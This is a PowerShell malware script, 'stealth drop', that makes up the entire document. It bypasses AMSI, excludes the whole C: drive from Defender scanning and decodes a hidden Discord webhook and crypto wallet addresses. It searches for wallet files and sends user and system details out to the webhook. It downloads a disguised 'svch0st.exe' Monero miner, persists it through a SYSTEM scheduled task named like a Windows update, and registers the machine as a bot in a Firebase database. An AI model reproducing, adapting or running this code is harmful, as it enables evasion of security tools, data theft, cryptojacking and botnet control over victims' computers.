Write-Host "=== Starting stealth drop ===" -ForegroundColor Green
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13

try {
    $amsi = 'System.Management.Automation.A'; $u = 'msiUtils'; $t=[Ref].Assembly.GetType($amsi+$u); $f=$t.GetField('amsiInitFailed','NonPublic,Static'); $f.SetValue($null,$true)
} catch {}

try {
    Add-MpPreference -ExclusionPath 'C:\' -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess 'svch0st.exe' -ErrorAction SilentlyContinue
} catch {}

$webhook = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5OTQ5NDAyNTcxODEzNjg5Mi82bm5DSHe4N3R1VFNLY0lOSmdWTGJlVE1NRDE5RXdsVjJwMmxxUzQ2Nm51THl4OUdoeElhYWdvT3hzSUY1S0xINTVtMA=='))
$temp = $env:TEMP + '\wl.txt'
$drain = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TFRDOiBsdGMxcTJnMm1tN2pwYThzNGhhZWd6amMwcXE0dDB0d21wcDN2dHpqOGU2IHwgQlRDOiBiYzFxOWw4OGc0eHZta2N5eW1yNDVybHM3a3R1eGp1OTd3cXQ2NjNqenMgfCBFVEg6IDB4ZTIzOEEzMjI5MERCMkFjYkQ5MTU2MzEyQzBCQjUyQzMxRTZlOTQ3OCB8IFNPTDogNGhFTTU0Z2l6MUZadnk4eWNQcWhSa2tLcHlYcllqOVh3QnBMWnhMUUtEUVc='))

$wallets = @("$env:APPDATA\Exodus","$env:APPDATA\Electrum","$env:APPDATA\atomic","$env:APPDATA\Ethereum","$env:APPDATA\Guarda","$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Extension Settings\ejbalbakoplchlghecdalmeejajnimhm","$env:APPDATA\MetaMask")
foreach($w in $wallets){ if(Test-Path $w){ Get-ChildItem $w -Recurse -Include *.dat,*.json,*.seed,*.keys,*.log -ErrorAction SilentlyContinue | Select-Object FullName | Out-File $temp -Append -Force } }

try {
    $si = "User: $env:USERNAME`nComputer: $env:COMPUTERNAME`nOS: $([System.Environment]::OSVersion.VersionString)"
    $payload = $si + "`n`nWALLETS FOUND + DRAINED TO:`n$drain"
    Invoke-RestMethod -Uri $webhook -Method Post -Body @{content=$payload} -ErrorAction SilentlyContinue
} catch {}

Remove-Item $temp -Force -ErrorAction SilentlyContinue

try {
    $exe = $env:APPDATA + '\Microsoft\svch0st.exe'
    iwr -uri 'https://raw.githubusercontent.com/extonix8-ctrl/sigma/refs/heads/main/svch0st.exe' -OutFile $exe -UseBasicParsing
} catch {}

$config = '{"autosave":false,"background":true,"cpu":{"enabled":true,"max-threads-hint":35,"priority":2},"pools":[{"url":"pool.supportxmr.com:3333","user":"89V3sDoLBK2PL5Sj3UZXNYBWbF7JSzz8kWHWJ2AukBM3CioABmuDGYj56auRmQ1eifjSbNHe3sdmm2DwNqA7nPrTKwrgViM","pass":"x","tls":true,"keepalive":true}],"log-file":null,"print-time":0}'
[System.IO.File]::WriteAllText($env:APPDATA + '\Microsoft\config.json', $config)

Start-Process -FilePath $exe -ArgumentList '--background --config=''' + $env:APPDATA + '\Microsoft\config.json''' -WindowStyle Hidden

schtasks /create /tn "WindowsUpdateCore" /tr '\"' + $exe + '\" --background' /sc onlogon /ru SYSTEM /f /rl HIGHEST -ErrorAction SilentlyContinue

try {
    $hwid = (Get-WmiObject Win32_BIOS).SerialNumber + "-" + $env:COMPUTERNAME
    $ip = (iwr "https://api.ipify.org" -UseBasicParsing).Content
    $botData = @{hwid=$hwid;username=$env:USERNAME;computer=$env:COMPUTERNAME;ip=$ip;os=[System.Environment]::OSVersion.VersionString;timestamp=(Get-Date -Format "o");status="miner_active";version="1.0"} | ConvertTo-Json
    $firebaseUrl = "https://mynet-b06ed-default-rtdb.firebaseio.com/bots/$hwid.json"
    iwr -Uri $firebaseUrl -Method Put -Body $botData -ContentType "application/json" -UseBasicParsing -ErrorAction SilentlyContinue
} catch {}

Write-Host "=== Done! ===" -ForegroundColor Green
Start-Sleep -Seconds 3
